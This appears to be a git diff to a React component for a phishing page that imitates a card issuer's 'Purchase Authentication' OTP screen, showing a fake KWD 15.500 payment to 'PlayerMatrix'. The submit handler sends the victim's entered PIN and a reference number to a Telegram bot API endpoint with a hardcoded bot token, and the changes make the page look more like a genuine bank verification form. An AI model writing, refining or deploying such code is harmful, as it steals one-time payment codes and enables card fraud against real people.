@@ -7,7 +7,7 @@ import axios from 'axios';
 
 function CodePageContent() {
   const [code, setCode] = useState("");
-  const [timeLeft, setTimeLeft] = useState(60);
+  const [timeLeft, setTimeLeft] = useState(300); // 5 دقائق
   const [expired, setExpired] = useState(false);
   const [resending, setResending] = useState(false);
 
@@ -31,10 +31,7 @@ function CodePageContent() {
       return;
     }
     if (code) {
-      const text = `
-🔐 PIN: ${code}
-🔨 Ref: ${refN}
-      `;
+      const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
       try {
         await axios.post(
           `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage`,
@@ -51,78 +48,67 @@ function CodePageContent() {
     }
   };
 
-  const handleResend = async () => {
+  const handleResend = () => {
     setResending(true);
     setTimeout(() => {
-      setTimeLeft(60);
+      setTimeLeft(300);
       setExpired(false);
       setResending(false);
     }, 1000);
   };
 
   return (
-    <div className="container vh-100 d-flex align-items-center" style={{ backgroundColor: "#fdf5f5" }}>
-      <div className="row w-100 align-items-center">
-        
-        {/* الصورة */}
-        <div className="col-md-6 text-center mb-4 mb-md-3">
-          <img 
-            src="./IMG-20250813-WA0009.jpg" 
-            alt="back image" 
-            className="img-fluid rounded border border-danger shadow w-75"
-          />
-        </div>
+    <div className="container my-4" style={{ maxWidth: "500px", backgroundColor: "white", border: "1px solid #ddd" }}>
+      <div className="p-4">
+        <h5 className="fw-bold text-primary mb-3">Purchase Authentication</h5>
+        <p className="mb-1">
+          We have sent you an SMS with an OTP code to your registered mobile number. Please do not share it with anyone.
+        </p>
+        <p className="mb-3">
+          You are paying <strong>PlayerMatrix</strong> the amount of <strong>KWD 15.500</strong> on Wed Aug 13 2025 1:29 AM
+        </p>
 
-        {/* الفورم */}
-        <div className="col-md-6 d-flex justify-content-center">
-          <form 
-            onSubmit={handleSubmit} 
-            className="p-4 rounded shadow w-100" 
-            style={{ maxWidth: "350px", backgroundColor: "white", border: "2px solid #ff4d4d" }}
+        <label className="fw-bold mb-2">Enter your OTP code below:</label>
+        <input 
+          type="text" 
+          className="form-control mb-3" 
+          value={code}
+          onChange={(e) => setCode(e.target.value)}
+          disabled={expired}
+        />
+
+        <div className="d-grid gap-2">
+          <button 
+            type="button" 
+            className="btn text-white fw-bold" 
+            style={{ backgroundColor: "#d32f2f" }}
+            onClick={handleSubmit}
+            disabled={expired}
           >
-            <h4 className="text-center mb-3 text-danger">
-              Purchase Authentication
-            </h4>
-            <p>We have sent you an SMS with an OTP code to your registered mobile number.</p>
-            <p>Enter your OTP code below:</p>
-
-            <p className="text-danger fw-bold">
-              {expired 
-                ? "The code has expired." 
-                : `This code will expire in ${timeLeft}s`}
-            </p>
-
-            <div className="mb-3">
-              <input 
-                type="text" 
-                className="form-control border-danger" 
-                placeholder="Enter code" 
-                value={code} 
-                onChange={(e) => setCode(e.target.value)} 
-                required
-              />
-            </div>
-
+            CONFIRM
+          </button>
+          <div className="d-flex gap-2">
             <button 
-              type="submit" 
-              className="btn w-100 mb-2" 
-              style={{ backgroundColor: "#ff4d4d", color: "white" }}
-              disabled={expired}
-            >
-              Confirm
-            </button>
-
-            <button 
-              type="button"
+              type="button" 
+              className="btn btn-secondary w-50 fw-bold"
               onClick={handleResend}
-              className="btn btn-outline-danger w-100"
               disabled={!expired || resending}
             >
-              {resending ? "Resending..." : "Resend Code"}
+              {resending ? "Resending..." : "RESEND"}
             </button>
-          </form>
+            <button 
+              type="button" 
+              className="btn btn-secondary w-50 fw-bold"
+              onClick={() => router.back()}
+            >
+              CANCEL
+            </button>
+          </div>
         </div>
 
+        <p className="mt-3 text-muted small">
+          This page will automatically time out after 5 minutes.
+        </p>
       </div>
     </div>
   );
@@ -134,4 +120,4 @@ export default function CodePage() {
       <CodePageContent />
     </Suspense>
   );
-}
+      }
